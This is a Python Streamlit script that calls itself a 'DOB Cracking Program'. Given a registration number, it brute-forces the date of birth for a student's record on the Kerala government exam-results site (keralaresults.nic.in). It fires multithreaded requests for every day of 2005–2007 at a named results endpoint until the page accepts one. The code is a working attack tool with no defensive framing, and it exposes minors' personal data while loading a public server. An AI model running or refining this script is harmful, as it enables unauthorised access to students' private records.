import streamlit as st
import requests
from datetime import datetime, timedelta
import time
import concurrent.futures

# Hacker-style intro message with minimal delay
st.header("Initialized Python3.x")
st.header("Target server: keralaresults.nic.in")
st.header("DOB Cracking Program")

# Replace this with the actual registration number you want to use
regno = st.text_input("Enter register no : ")

# Define the years in the desired priority order
years = st.multiselect("Select years to brute force", [2006, 2005, 2007], [2006, 2005, 2007])

# Create a container for the output
output_container = st.empty()

# Flag to stop the brute force when correct DOB is found
found = False

# Custom header
headers = {
    "Referer": "https://keralaresults.nic.in"
}

def check_dob(year, current_date):
    global found
    if found:
        return

    date_str = current_date.strftime("%d")  # day with leading zero
    month_str = current_date.strftime("%m")  # month with leading zero
    year_str = current_date.strftime("%Y")  # year as four digits
    
    url = f"https://keralaresults.nic.in/dhse24mra9345/dhses.asp?treg={regno}&dob={date_str}/{month_str}/{year_str}&sid=0.6227467480652762"
    
    try:
        response = requests.get(url, headers=headers)
        
        if 'try' in response.text:
            output_message = f"<span style='color:red; background-color:black; padding: 5px'>{date_str}/{month_str}/{year_str}</span> - Incorrect DOB, continuing..."
        else:
            output_message = f"<span style='color:green; background-color:black; padding: 5px'>{date_str}/{month_str}/{year_str}</span> - Correct DOB found!"
            found = True
            output_container.markdown(output_message, unsafe_allow_html=True)
            return
                
    except requests.exceptions.RequestException as e:
        output_message = f"Date: c - Request failed with exception: {e}"
    
    output_container.markdown(output_message, unsafe_allow_html=True)

# Check if registration number is provided
if regno:
    # Loop through each year in the specified order
    for year in years:
        if found:
            break

        # Define the start and end dates for the current year
        start_date = datetime(year, 1, 1)
        end_date = datetime(year, 12, 31)
        
        # Iterate over each day using multithreading
        with concurrent.futures.ThreadPoolExecutor() as executor:
            executor.map(lambda d: check_dob(year, d), [start_date + timedelta(days=d) for d in range((end_date - start_date).days + 1)])

# Display final output message
if found and regno:
    st.success(f"DOB Found {date_str}/{month_str}/{year_str}")
elif regno:
    st.error("Brute force attack unsuccessful.")
